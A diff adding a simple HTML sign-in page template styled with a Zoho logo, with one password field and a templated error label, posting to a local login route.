@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <link rel="stylesheet" href="./css/signin.css">
+</head>
+<body>
+    <form action="/login/loginpass" method="post">
+    <div class="container">
+        <div class="box">
+            <img src="./img/zoho logo.png" alt="" width="120px" height="auto">
+        </div>
+        <div class="box">
+            <h2>Sign In</h2>
+            <p>to access Zoho Home</p>
+        </div>
+        <div class="box input">
+            <input type="password" name="password" id="password" placeholder="Password">
+            <label class="error">{{anyerror}}</label>
+            <button type="submit">Next</button>
+        </div>
+        <div class="box link">
+        </div>
+    </div>
+    </form>
+</body>
+</html>
